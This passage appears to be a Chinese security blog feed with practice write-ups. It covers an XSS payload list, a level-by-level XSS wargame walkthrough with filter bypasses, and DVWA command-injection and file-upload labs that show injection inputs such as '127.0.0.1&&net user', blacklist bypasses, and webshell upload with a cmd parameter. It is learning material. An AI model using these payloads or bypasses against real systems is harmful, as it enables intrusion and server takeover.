data=data:text/html;base64,PHNjcmlwdD5hbGVydCgiS0NGIik8L3NjcmlwdD4=&gt;&lt;/object&gt; marquee标签&lt;marquee onstart=&quot;alert(&apos;sometext&apos;)&quot;&gt;&lt;/marquee&gt; isindex标签&lt;isindex type=image src=1 onerror=alert(1)&gt; &lt;isindex action=javascript:alert(1) type=image&gt; input标签通过event来调用js。和之前的button的例子一样通过 autofocus来达到无须交互即可 &lt;input onfocus=javascript:alert(1) autofocus&gt; &lt;input onblur=javascript:alert(1) autofocus&gt;&lt;input autofocus&gt; select标签&lt;select onfocus=javascript:alert(1) autofocus&gt; textarea标签&lt;textarea onfocus=javascript:alert(1) autofocus&gt; keygen标签&lt;keygen onfocus=javascript:alert(1) autofocus&gt; frameset标签&lt;frameset onload=alert(1)&gt; &lt;embed标签&gt;&lt;embed src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgiS0NGIik8L3NjcmlwdD4=&quot;&gt;&lt;/embed&gt; //chrome &lt;embed src=javascript:alert(1)&gt; //firefox svg标签&lt;svg onload=&quot;javascript:alert(1)&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;&lt;/svg&gt; &lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;&lt;g onload=&quot;javascript:alert(1)&quot;&gt;&lt;/g&gt;&lt;/svg&gt; //chrome有效 math标签&lt;math href=&quot;javascript:javascript:alert(1)&quot;&gt;CLICKME&lt;/math&gt; &lt;math&gt;&lt;y/xlink:href=javascript:alert(51)&gt;test1 &lt;math&gt; &lt;maction actiontype=&quot;statusline#http://wangnima.com&quot; xlink:href=&quot;javascript:alert(49)&quot;&gt;CLICKME&lt;/maction&gt; &lt;/math&gt; video标签&lt;video&gt;&lt;source onerror=&quot;alert(1)&quot;&gt; &lt;video src=x onerror=alert(48)&gt; audio标签&lt;audio src=x onerror=alert(47)&gt; 在这些标签里面凡是出现在on*事件值里面的javascript:都是多余的 平时搞XSS可能会用得到的技巧Referer为空才可以访问有一些界面为了避免是别的地方跳转过来的 Referer必须为空，那什么情况Referer为空呢，第一是HTTPS协议到HTTP的协议，这时候Referer为空，或者用嵌入一个iframe用data加base64编码的方式，还可以用&lt;meta name=”referrer” content=”never” &gt;来达到referer为空 注意返回的type类型返回什么样的类型决定了浏览器渲染还是不渲染你的XSS代码，只有返回的是XML或者HTML 才有可能会执行成功你的XSS代码，不过不同浏览器的特性不同，有一些返回的type类型可能也是可以执行XSS的，尤其是一些老的ie浏览器，具体可以看看freebuf之前发布过的一篇关于type和浏览器执行的表格。 阻止浏览器302跳转总所总之，浏览器遇到302，301会直接跟进头部的跳转链接，可是有时候XSS界面就是这个跳转页面，这个跳转url是可控的，并且在浏览器显示如果浏览器没有正确跳转，请点击XXX的字样。那怎么样才可以让浏览器不自动跳转呢？一种就是把跳转的url端口设置低于80 譬如输入http://xss.com:0” onclick=”alert(/1/) ,还可以使用CSP策略嵌入一个iframe 拿来配合CRLF进行XSS会很舒服 注意头部的X-XSS-Protection这个东西就是让浏览器帮助一起防御XSS 为0则不帮助，为1则把可能含有的在代码中直接拿掉，还有一个是类型1;black这样的，就是在url地址直接把认为可能是xss的拿掉，所以有时候并不是你的XSS代码被服务器过滤了，还有可能是被浏览器拿走了 HTML Entity介绍在编写HTML页面时，需要用到”&lt;”、”&gt;”、”空格”等符号，直接输入这些符号时，会错误的把它们与标记混在一起，非常不利于编码。 那么就需要把这些字符进行转义，以另一种方式抒写，以相同的形式展现。 在HTML中，这些字符可称为HTML Entity，即HTML 字符实体。一个HTML Entity都含有2种转义格式：Entity Name 和 Entity Number。 Entity Name格式： &entityName; 说明：”&amp;”开头，”;”结尾，以语义的形式描述字符。如字符”&lt;”，英文名称为”less than”，Entity Name为”&lt;”，取自”less than”2个单词的首字母。 Entity Number格式： &#entityNumber; 说明：”&amp;#”开头，”;”结尾，以编号的形式描述字符。此编号可以为十进制或十六进制(以”&amp;#x”开头)等数字格式。 示例&lt;p&gt;字符 ：&lt;&lt;/p&gt; &lt;p&gt;Entity Name ：&amp;lt;&lt;/p&gt; &lt;p&gt;Entity Number(十进制) ：&amp;#60;&lt;/p&gt; &lt;p&gt;Entity Number(十六进制) ：&amp;#x3c;&lt;/p&gt; Character Character Entity Entity Number(十进制) Entity Number(十六进制) &amp;nbsp; &amp;#32; &amp;#x ! &amp;excl; &amp;#33; &amp;#x21 &quot; &amp;quot; &amp;#34; &amp;#x22 # &amp;num; &amp;#35; &amp;#x23 $ &amp;dollar; &amp;#36; &amp;#x24 % &amp;percnt; &amp;#37; &amp;#x25 &amp; &amp;amp; &amp;#38; &amp;#x26 &apos; &amp;apos; &amp;#39; &amp;#x27 ( &amp;lpar; &amp;#40; &amp;#x28 ) &amp;rpar; &amp;#41; &amp;#x29 * &amp;ast; &amp;#42; &amp;#x2A + &amp;plus; &amp;#43; &amp;#x2B , &amp;comma; &amp;#44; &amp;#x2C - &amp;hyphen; &amp;#45; &amp;#x2D . &amp;period; &amp;#46; &amp;#x2E / &amp;sol; &amp;#47; &amp;#x2F : &amp;colon; &amp;#58; &amp;#x3A ; &amp;semi; &amp;#59; &amp;#x3B &lt; &amp;lt; &amp;#60; &amp;#x3C = &amp;equals; &amp;#61; &amp;#x3D &gt; &amp;gt; &amp;#62; &amp;#x3E ? &amp;quest; &amp;#63; &amp;#x3F @ &amp;commat; &amp;#64; &amp;#x40 [ &amp;lsqb; &amp;#91; &amp;#x5B \ &amp;bsol; &amp;#92; &amp;#x5C ] &amp;rsqb; &amp;#93; &amp;#x5D ^ &amp;circ; &amp;#94; &amp;#x5E _ &amp;lowbar; &amp;#95; &amp;#x5F ` &amp;grave; &amp;#96; &amp;#x60 { &amp;lcub; &amp;#123; &amp;#x7B | &amp;verbar; &amp;#124; &amp;#x7C } &amp;rcub; &amp;#125; &amp;#x7D ~ &amp;tilde; &amp;#126; &amp;#x7E 参考了解XSS攻击 SVG XSS的一个黑魔法 可以被XSS利用的HTML标签和一些手段技巧 HTML Entity字符实体 HTML Entity 字符对照表]]></content>
      <tags>
        <tag>practice</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Wargame-XSS-game]]></title>
    <url>%2F2018%2F08%2F03%2FWargame-alert(1)-haozi%2F</url>
    <content type="text"><![CDATA[Wargame XSS-alert(1)0x00 没有任何过滤server codefunction render (input) { return &apos;&lt;div&gt;&apos; + input + &apos;&lt;/div&gt;&apos; } 分析对输入 input没有做任何的过滤，直接在div标签之间输出了 input code&lt;script&gt;alert(1)&lt;/script&gt; 0x01 textarea标签server codefunction render (input) { return &apos;&lt;textarea&gt;&apos; + input + &apos;&lt;/textarea&gt;&apos; } 分析对于输出input没有做任何的过滤，将input输出在了 textarea标签里,使用”“闭合前面的标签即可 Input code&lt;/textarea&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;textarea&gt; 0x02 input标签server codefunction render (input) { return &apos;&lt;input type=&quot;name&quot; value=&quot;&apos; + input + &apos;&quot;&gt;&apos; } 分析这里返回了一个input标签，只需要闭合前面的双引号和尖括号即可 “&gt;或者是在input标签里使用onfocus事件，加上autofocus自动执行，无需交互 Input code1&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt; 1&quot; onfocus=javascript:alert(1) autofocus&gt; 0x03 过滤圆括号和方括号server codefunction render (input) { const stripBracketsRe = /[()]/g input = input.replace(stripBracketsRe, &apos;&apos;) return input } 分析使用正则表达式全局匹配将[]和()替换成空字符 Input code1、使用 反撇号 ` 代替圆括号 &lt;img src=0 onerror=&quot;alert`1`&quot;&gt; 2、将圆括号进行html实体编码 &lt;img src=1 onerror=alert&amp;#40;1&amp;#41;&gt; &lt;img src=1 onerror=alert&amp;#x28;1&amp;#x29&gt; &lt;img src=1 onerror=alert&amp;lpar;1&amp;rpar;&gt; 0x04 过滤方括号、圆括号、反撇号server codefunction render (input) { const stripBracketsRe = /[()`]/g input = input.replace(stripBracketsRe, &apos;&apos;) return input } 分析过滤了方括号、圆括号、反撇号 Input code使用HTML实体编码绕过 &lt;img src=1 onerror=alert&amp;#40;1&amp;#41;&gt; &lt;img src=1 onerror=alert&amp;#x28;1&amp;#x29&gt; &lt;img src=1 onerror=alert&amp;lpar;1&amp;rpar;&gt; &lt;svg&gt;&lt;script&gt;alert&amp;#40;1&amp;#41&lt;/script 0x05 绕过注释符server codefunction render (input) { input = input.replace(/--&gt;/g, &apos;😂&apos;) return &apos;&lt;!-- &apos; + input + &apos; --&gt;&apos; } 分析全局过滤了- 和 &gt; 防止我们闭合注释 使用–!&gt;绕过并跳出注释； html注释：或者 Input code--!&gt;&lt;script&gt;alert(1)&lt;/script&gt; 0x06 换行绕过server codefunction render (input) { input = input.replace(/auto|on.*=|&gt;/ig, &apos;_&apos;) return `&lt;input value=1 ${input} type=&quot;text&quot;&gt;` } 分析全局匹配无论大小写以auto开头或者on开头=结尾的字符串，将其替换成_而且可以看到输出点限制在了input标签内 Input codetype=image src onerror =alert(1) 2、使用换行符绕过正则匹配 onclick = alert(1) 0x07server codefunction render (input) { const stripTagsRe = /&lt;\/?[^&gt;]+&gt;/gi input = input.replace(stripTagsRe, &apos;&apos;) return `&lt;article&gt;${input}&lt;/article&gt;` } 分析匹配以 &lt;开头 &gt; 结尾的字符串\/? 匹配 / 零次或一次[^&gt;] 该表达式匹配除 &gt; 之外的其他字符 Input code利用浏览器容错性，去掉&gt;闭合绕过；最后加个空格或者回车 &lt;svg/onload=&apos;alert(1)&apos; &lt;img src=x onerror=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;1&amp;#41; &lt;svg/onload=alert(1) 0x08server codefunction render (src) { src = src.replace(/&lt;\/style&gt;/ig, &apos;/* \u574F\u4EBA */&apos;) return ` &lt;style&gt; ${src} &lt;/style&gt; ` } 分析将&lt;/style&gt;替换掉 在&gt;前面加个空格绕过 &lt;/style &gt; Input code1、在标签&gt;闭合前加空格绕过； &lt;/style &gt;&lt;script&gt;alert(1)&lt;/script&gt; 2、在标签&gt;闭合前换行绕过； &lt;/style &gt;&lt;script&gt;alert(1)&lt;/script&gt; 0x09server codefunction render (input) { let domainRe = /^https?:\/\/www\.segmentfault\.com/ if (domainRe.test(input)) { return `&lt;script src=&quot;${input}&quot;&gt;&lt;/script&gt;` } return &apos;Invalid URL&apos; } 分析验证url是不是 https://www.segmentfault.com可以接着在后面闭合构造或者在构造符合要求的url去调用 正则匹配以https://www.segmentfault.com开头的输入，若无匹配返回失败； input code闭合前面的 script https://www.segmentfault.com&quot;&gt;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;&quot; 或者构造url调用自己的js代码 https://www.segmentfault.com.xxxxx.xxxx/xss.js 0x0Aserver codefunction render (input) { function escapeHtml(s) { return s.replace(/&amp;/g, &apos;&amp;amp;&apos;) .replace(/&apos;/g, &apos;&amp;#39;&apos;) .replace(/&quot;/g, &apos;&amp;quot;&apos;) .replace(/&lt;/g, &apos;&amp;lt;&apos;) .replace(/&gt;/g, &apos;&amp;gt;&apos;) .replace(/\//g, &apos;&amp;#x2f&apos;) } const domainRe = /^https?:\/\/www\.segmentfault\.com/ if (domainRe.test(input)) { return `&lt;script src=&quot;${escapeHtml(input)}&quot;&gt;&lt;/script&gt;` } return &apos;Invalid URL&apos; } 分析将 &amp; ‘ “ &lt; &gt; / 全局替换为实体字符但是可以使用以https://www.segmentfault.com开头的url链接去调用js Input codehttps://www.segmentfault.com.af/alert.js 0x0Bserver codefunction render (input) { input = input.toUpperCase() return `&lt;h1&gt;${input}&lt;/h1&gt;` } 分析将输入的所有字符都转换为大写大写的ALERT不是有效的JavaScript函数，用编码绕过小写到大写的替换即可 Input code&lt;img src=0 onerror=&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&gt; &lt;svg&gt;&lt;img src=0 onerror=&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&gt; &lt;svg&gt;&lt;script&gt;&lt;img src=0 onerror=&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&gt;&lt;/script&gt; 0x0Cserver codefunction render (input) { input = input.replace(/script/ig, &apos;&apos;) input = input.toUpperCase() return &apos;&lt;h1&gt;&apos; + input + &apos;&lt;/h1&gt;&apos; } 分析全局匹配不能使用script Input code&lt;img src=0 onerror=&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&gt; 0x0Dserver codefunction render (input) { input = input.replace(/[&lt;/&quot;&apos;]/g, &apos;&apos;) return ` &lt;script&gt; // alert(&apos;${input}&apos;) &lt;/script&gt; ` } 分析正则匹配过滤 &lt;/“‘ 替换为空字符，输出是在//注释后面 输出点直接是在script标签内，通过换行绕过//注释由于过滤了 / ，//和/**/注释失效，过滤了’ 无法使用 (‘ 闭合后面的 ‘)可使用HTML的–&gt;闭合绕过 input code1 alert(1) --&gt; 0x0Eserver codefunction render (input) { input = input.replace(/&lt;([a-zA-Z])/g, &apos;&lt;_$1&apos;) input = input.toUpperCase() return &apos;&lt;h1&gt;&apos; + input + &apos;&lt;/h1&gt;&apos; } 分析正则匹配以&lt;开头，后面接英文字母大小写字符 即 &lt;+字母 的替换掉 查资料发现字符ſ大写后为S（ſ不等于s） input&lt;ſcript src=0 onerror=&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&gt;&lt;/script&gt; 0x0Fserver codefunction render (input) { function escapeHtml(s) { return s.replace(/&amp;/g, &apos;&amp;amp;&apos;) .replace(/&apos;/g, &apos;&amp;#39;&apos;) .replace(/&quot;/g, &apos;&amp;quot;&apos;) .replace(/&lt;/g, &apos;&amp;lt;&apos;) .replace(/&gt;/g, &apos;&amp;gt;&apos;) .replace(/\//g, &apos;&amp;#x2f;&apos;) } return `&lt;img src onerror=&quot;console.error(&apos;${escapeHtml(input)}&apos;)&quot;&gt;` } 分析正则表达式将 &amp; ‘ “ &lt; &gt; / 转换为实体符 console.error()向 Web 控制台输出一条错误消息。 虽然对很多字符进行了转义，但转义的结果仍在引号中，会被再次解释，故当做没有任何转义即可 input code&apos;);alert(&apos;1 0x010server codefunction render (input) { return ` &lt;script&gt; window.data = ${input} &lt;/script&gt; ` } 分析没有做任何过滤 input codealert(1) 0x11server code// from alf.nu function render (s) { function escapeJs (s) { return String(s) .replace(/\\/g, &apos;\\\\&apos;) .replace(/&apos;/g, &apos;\\\&apos;&apos;) .replace(/&quot;/g, &apos;\\&quot;&apos;) .replace(/`/g, &apos;\\`&apos;) .replace(/&lt;/g, &apos;\\74&apos;) .replace(/&gt;/g, &apos;\\76&apos;) .replace(/\//g, &apos;\\/&apos;) .replace(/\n/g, &apos;\\n&apos;) .replace(/\r/g, &apos;\\r&apos;) .replace(/\t/g, &apos;\\t&apos;) .replace(/\f/g, &apos;\\f&apos;) .replace(/\v/g, &apos;\\v&apos;) // .replace(/\b/g, &apos;\\b&apos;) .replace(/\0/g, &apos;\\0&apos;) } s = escapeJs(s) return ` &lt;script&gt; var url = &apos;javascript:console.log(&quot;${s}&quot;)&apos; var a = document.createElement(&apos;a&apos;) a.href = url document.body.appendChild(a) a.click() &lt;/script&gt; ` } 分析在 \\ &apos; ` &lt; &gt; \ \n \r \t \f \v 前面加 \ input code&quot;);alert(1)(&quot; 0x12server code// from alf.nu function escape (s) { s = s.replace(/&quot;/g, &apos;\\&quot;&apos;) return &apos;&lt;script&gt;console.log(&quot;&apos; + s + &apos;&quot;);&lt;/script&gt;&apos; } 分析正则表达式将双引号进行了使用\转义我们可以在加一个\将\再转义一次 input code\&quot;);alert(1);// 参考PayloadsAllTheThings XSS插入绕过一些方式总结 可以被XSS利用的HTML标签和一些手段技巧]]></content>
      <tags>
        <tag>practice</tag>
        <tag>XSS</tag>
        <tag>XSS-game</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DVWA-File_Injection]]></title>
    <url>%2F2018%2F07%2F31%2FDVWA-Command_Injection%2F</url>
    <content type="text"><![CDATA[命令注入介绍Command Injection，即命令注入，是指通过提交恶意构造的参数破坏命令语句结构，从而达到执行恶意命令的目的。 LowCommand Injection Source&lt;?php if( isset( $_POST[ &apos;Submit&apos; ] ) ) { // Get input $target = $_REQUEST[ &apos;ip&apos; ]; // Determine OS and execute the ping command. if( stristr( php_uname( &apos;s&apos; ), &apos;Windows NT&apos; ) ) { // Windows $cmd = shell_exec( &apos;ping &apos; . $target ); } else { // *nix $cmd = shell_exec( &apos;ping -c 4 &apos; . $target ); } // Feedback for the end user echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;; } ?&gt; 分析tristr(string,search,before_search) stristr函数搜索字符串在另一字符串中的第一次出现，返回字符串的剩余部分（从匹配点），如果未找到所搜索的字符串，则返回 FALSE。参数string规定被搜索的字符串，参数search规定要搜索的字符串（如果该参数是数字，则搜索匹配该数字对应的 ASCII 值的字符），可选参数before_true为布尔型，默认为“false” ，如果设置为 “true”，函数将返回 search 参数第一次出现之前的字符串部分。 php_uname(mode) 这个函数会返回运行php的操作系统的相关描述，参数mode可取值”a” （此为默认，包含序列”s n r v m”里的所有模式），”s ”（返回操作系统名称），”n”（返回主机名），” r”（返回版本名称），”v”（返回版本信息）， ”m”（返回机器类型）。 服务器通过判断操作系统执行不同ping命令，但是对ip参数并未做任何的过滤，导致了严重的命令注入漏洞 漏洞利用window和linux系统都可以用&amp;&amp;来执行多条命令 注意：如果在ping命令后使用&amp;&amp;号但没有给ping命令输入IP地址时，这时候将不会返回任何值，因为&amp;&amp;号后面命令是建立在前面命令已经正确执行的前提之下的，另外也有两个管道符（||）的用法，但是条件是前面的命令执行失败，和&amp;&amp;号的相反 127.0.0.1&amp;&amp;net user 由于编码的问题，可能看到的是乱码，但是在源代码中可以看到 127.0.0.1&amp;&amp;whoami 127.0.0.1&amp;&amp;net localgroup administrators MiddleCommand Injection Source&lt;?php if( isset( $_POST[ &apos;Submit&apos; ] ) ) { // Get input $target = $_REQUEST[ &apos;ip&apos; ]; // Set blacklist $substitutions = array( &apos;&amp;&amp;&apos; =&gt; &apos;&apos;, &apos;;&apos; =&gt; &apos;&apos;, ); // Remove any of the charactars in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command. if( stristr( php_uname( &apos;s&apos; ), &apos;Windows NT&apos; ) ) { // Windows $cmd = shell_exec( &apos;ping &apos; . $target ); } else { // *nix $cmd = shell_exec( &apos;ping -c 4 &apos; . $target ); } // Feedback for the end user echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;; } ?&gt; 分析将 &amp;&amp; 和 ; 替换成了空字符，本质上采用的是黑名单机制,但是我们还可以用&amp;号、管道符|等直接绕过 &amp;号与&amp;&amp;号不同，因为是同时执行，所以并不存在前面的命令必须执行了后面的命令才能执行的问题。例子中不输入IP地址也能执行后面的命令： 管道符能正常执行，但管道符的限制是只显示后面那条命令的执行结果： 漏洞利用利用方式1127.0.0.1&amp;net user 127.0.0.1|whoami 利用方式2因为会过滤掉 &amp;&amp; 和 ; 如果我们狗造成 &amp;;&amp; —–&gt; &amp;&amp; 127.0.0.1&amp;;&amp;ipconfig HighCommand Injection Source&lt;?php if( isset( $_POST[ &apos;Submit&apos; ] ) ) { // Get input $target = trim($_REQUEST[ &apos;ip&apos; ]); // Set blacklist $substitutions = array( &apos;&amp;&apos; =&gt; &apos;&apos;, &apos;;&apos; =&gt; &apos;&apos;, &apos;| &apos; =&gt; &apos;&apos;, &apos;-&apos; =&gt; &apos;&apos;, &apos;$&apos; =&gt; &apos;&apos;, &apos;(&apos; =&gt; &apos;&apos;, &apos;)&apos; =&gt; &apos;&apos;, &apos;`&apos; =&gt; &apos;&apos;, &apos;||&apos; =&gt; &apos;&apos;, ); // Remove any of the charactars in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command. if( stristr( php_uname( &apos;s&apos; ), &apos;Windows NT&apos; ) ) { // Windows $cmd = shell_exec( &apos;ping &apos; . $target ); } else { // *nix $cmd = shell_exec( &apos;ping -c 4 &apos; . $target ); } // Feedback for the end user echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;; } ?&gt; 分析关键代码 &apos;&amp;&apos; =&gt; &apos;&apos;, &apos;;&apos; =&gt; &apos;&apos;, &apos;| &apos; =&gt; &apos;&apos;, &apos;-&apos; =&gt; &apos;&apos;, &apos;$&apos; =&gt; &apos;&apos;, &apos;(&apos; =&gt; &apos;&apos;, &apos;)&apos; =&gt; &apos;&apos;, &apos;`&apos; =&gt; &apos;&apos;, &apos;||&apos; =&gt; &apos;&apos;, 这里进一步完善了黑名单机制，但是仔细看，会发现第三个是将’| ‘替换为空格，可以看到在管道符后面还有一个空格，我们可以使用 ‘ |’将空格放到前面来绕过,或者在 | 前后不留有空格 “|”是管道符，表示将Command 1的输出作为Command 2的输入，并且只打印Command 2执行的结果 漏洞利用127.0.0.1 |net user 127.0.0.1|dir ImossibleCommand Injection Source&lt;?php if( isset( $_POST[ &apos;Submit&apos; ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); // Get input $target = $_REQUEST[ &apos;ip&apos; ]; $target = stripslashes( $target ); // Split the IP into 4 octects $octet = explode( &quot;.&quot;, $target ); // Check IF each octet is an integer if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) { // If all 4 octets are int&apos;s put the IP back together. $target = $octet[0] . &apos;.&apos; . $octet[1] . &apos;.&apos; . $octet[2] . &apos;.&apos; . $octet[3]; // Determine OS and execute the ping command. if( stristr( php_uname( &apos;s&apos; ), &apos;Windows NT&apos; ) ) { // Windows $cmd = shell_exec( &apos;ping &apos; . $target ); } else { // *nix $cmd = shell_exec( &apos;ping -c 4 &apos; . $target ); } // Feedback for the end user echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;; } else { // Ops. Let the user name theres a mistake echo &apos;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&apos;; } } // Generate Anti-CSRF token generateSessionToken(); ?&gt; stripslashes(string) stripslashes函数会删除字符串string中的反斜杠，返回已剥离反斜杠的字符串。 explode(separator,string,limit) 把字符串打散为数组，返回字符串的数组。参数separator规定在哪里分割字符串，参数string是要分割的字符串，可选参数limit规定所返回的数组元素的数目。 is_numeric(string) 检测string是否为数字或数字字符串，如果是返回TRUE，否则返回FALSE 分析关键部分 checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); 使用csrf防范机制，检查客户端和服务端的token是否相同 $target = stripslashes( $target ); 将变量的值进行实体化 $octet = explode( &quot;.&quot;, $target ); 将IP地址分割成四部分，并且检查是否是数字，而且长度是否为四，然后将这四部分连接起来]]></content>
      <tags>
        <tag>practice</tag>
        <tag>DVWA</tag>
        <tag>File_Injection</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DVWA-File_Upload]]></title>
    <url>%2F2018%2F07%2F30%2FDVWA-File_Upload%2F</url>
    <content type="text"><![CDATA[Vulnerability: File UploadIntruduce文件上传漏洞 形成的主因：由于对上传文件类型未验证或过滤机制不严，导致恶意用户可以上传脚本文件，通过上传文件可达到控制网站权限的目的 危害:攻击者可获得网站控制权限,查看、修改、删除网站数据,通过提权漏洞可获得主机权限 上传点：头像、附件、后台新闻编辑等等 利用条件成功上传木马文件 木马文件能够执行 上传路径可知 上传检查方式A 客户端javascript 检测(通常为检测文件扩展名) B 服务端MIME 类型检测(检测Content-Type 内容) C 服务端目录路径检测(检测跟path 参数相关的内容) D 服务端文件扩展名检测(检测跟文件extension 相关的内容) E 服务端文件内容检测(检测内容是否合法或含有恶意代码) 常见上传漏洞对文件类型无任何验证可直接上传相应脚本文件 本地javascript扩展名校验一切在客户端的校验都是伪校验 使用黑名单or白名单扩展名定义方式对比 上传文件未进行重命名结合web应用解析漏洞 客户端可控制上传参数部分敏感上传参数在客户端可控 数据库备份可通过备份功能修改文件后缀 检测绕过检测绕过 停止客户端检测脚本 MIME类型检测绕过 黑名单列表绕过 特殊文件名绕过 利用截断 利用解析漏洞 利用.htaccess文件 可修改上传文件 黑名单检测绕过1. 文件名大小写绕过用AsP，pHp之类的文件名绕过黑名单检测。 2. 名单列表绕过用黑名单里没有的名单进行攻击，比如黑名单里面没有asa或者cer之类。 3. 0x00截断绕过例如：help.asp .jpg(asp后面为0x00)，在判断时，大多函数取后缀名是从后往前取，故能够通过，但是在保存时，却被保存为help.asp。 4. .htaccess文件攻击配合名单列表绕过，上传一个自定义的.htaccess。 Low File Upload Source&lt;?php if( isset( $_POST[ &apos;Upload&apos; ] ) ) { // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; $target_path .= basename( $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ] ); // Can we move the file to the upload folder? if( !move_uploaded_file( $_FILES[ &apos;uploaded&apos; ][ &apos;tmp_name&apos; ], $target_path ) ) { // No echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;; } else { // Yes! echo &quot;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;; } } ?&gt; 分析basename() 函数返回路径中的文件名部分。 PHP 的全局数组 $_FILES，你可以从客户计算机向远程服务器上传文件。 第一个参数是表单的 input name，第二个下标可以是 &quot;name&quot;、&quot;type&quot;、&quot;size&quot;、&quot;tmp_name&quot; 或 &quot;error&quot;。如下所示： $_FILES[&quot;file&quot;][&quot;name&quot;] - 上传文件的名称 $_FILES[&quot;file&quot;][&quot;type&quot;] - 上传文件的类型 $_FILES[&quot;file&quot;][&quot;size&quot;] - 上传文件的大小，以字节计 $_FILES[&quot;file&quot;][&quot;tmp_name&quot;] - 存储在服务器的文件的临时副本的名称 $_FILES[&quot;file&quot;][&quot;error&quot;] - 由文件上传导致的错误代码 对于上传的文件没有做任何过滤 漏洞利用直接上传一句话 ../../hackable/uploads/shell_exe.php http://192.168.10.11/dvwa/hackable/uploads/shell_exe.php http://192.168.10.11/dvwa/hackable/uploads/shell_exe.php?cmd=ipconfig 找到路径并利用 传一句话连接菜刀 MiddleFile Upload Source&lt;?php if( isset( $_POST[ &apos;Upload&apos; ] ) ) { // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; $target_path .= basename( $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ] ); // File information $uploaded_name = $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ]; $uploaded_type = $_FILES[ &apos;uploaded&apos; ][ &apos;type&apos; ]; $uploaded_size = $_FILES[ &apos;uploaded&apos; ][ &apos;size&apos; ]; // Is it an image? if( ( $uploaded_type == &quot;image/jpeg&quot; || $uploaded_type == &quot;image/png&quot; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) ) { // Can we move the file to the upload folder? if( !move_uploaded_file( $_FILES[ &apos;uploaded&apos; ][ &apos;tmp_name&apos; ], $target_path ) ) { // No echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;; } else { // Yes! echo &quot;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;; } } else { // Invalid file echo &apos;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&apos;; } } ?&gt; 分析关键代码部分 ( $uploaded_type == &quot;image/jpeg&quot; || $uploaded_type == &quot;image/png&quot; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) 这里对文件类型了文件大小做了检查，要求Content-Type字段为image/jpeg 或 image/png ，内容的大小小于 100000 漏洞利用抓包后将Content_Type字段改为image/jpeg即可 采用%00截断在php版本小于5.3.4的版本中，当Magic_quote_gpc选项为off时，可以在文件名中使用%00截断，所以可以把上传文件命名a1.php%00.png进行绕过 HighFile Upload Source&lt;?php if( isset( $_POST[ &apos;Upload&apos; ] ) ) { // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; $target_path .= basename( $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ] ); // File information $uploaded_name = $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ]; $uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, &apos;.&apos; ) + 1); $uploaded_size = $_FILES[ &apos;uploaded&apos; ][ &apos;size&apos; ]; $uploaded_tmp = $_FILES[ &apos;uploaded&apos; ][ &apos;tmp_name&apos; ]; // Is it an image? if( ( strtolower( $uploaded_ext ) == &quot;jpg&quot; || strtolower( $uploaded_ext ) == &quot;jpeg&quot; || strtolower( $uploaded_ext ) == &quot;png&quot; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; getimagesize( $uploaded_tmp ) ) { // Can we move the file to the upload folder? if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) { // No echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;; } else { // Yes! echo &quot;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;; } } else { // Invalid file echo &apos;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG 